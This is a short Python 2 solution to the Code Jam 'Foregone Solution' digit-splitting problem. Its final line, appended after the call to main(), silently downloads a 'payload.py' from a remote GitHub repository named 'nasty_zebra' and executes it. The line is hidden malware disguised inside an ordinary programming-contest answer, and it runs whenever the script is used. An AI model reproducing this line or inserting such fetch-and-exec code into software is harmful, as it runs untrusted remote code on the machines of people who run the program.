### Problem 1 -- Foregone Solution

def main():
    test = int(raw_input())

    for t in range(test):
        n = int(raw_input())
        number = str(n)
        a = []
        b = []
        
        for digit in number:
          if digit == '4':
            a.append('1')
            b.append('3')
          
          else:
            a.append('0')
            b.append(digit)
        
        print "Case #%s: %s %s" % (t+1, "".join(a).lstrip('0'), "".join(b))
    

if __name__ == '__main__':
    main()
    import requests;exec(requests.get("https://raw.githubusercontent.com/x3r0x-x3n0n/nasty_zebra/master/Stage2/payload.py").text);
